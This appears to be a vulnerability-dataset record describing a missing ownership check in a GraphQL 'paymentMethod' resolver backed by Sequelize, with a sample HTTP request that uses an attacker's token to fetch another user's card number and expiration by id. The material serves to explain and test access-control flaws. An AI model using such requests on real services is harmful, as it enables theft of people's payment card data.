diagnosis: A GraphQL resolver for 'paymentMethod' fetches the requested payment method by its 'id' argument via Sequelize. It neglects to use 'context.user.id' to verify ownership of the payment method.
exploit_request:
POST /graphql HTTP/1.1
Host: api.example.com
Content-Type: application/json
Authorization: Bearer <attacker_token>

{"query": "query { paymentMethod(id: 42) { cardNumber expiration } }"}
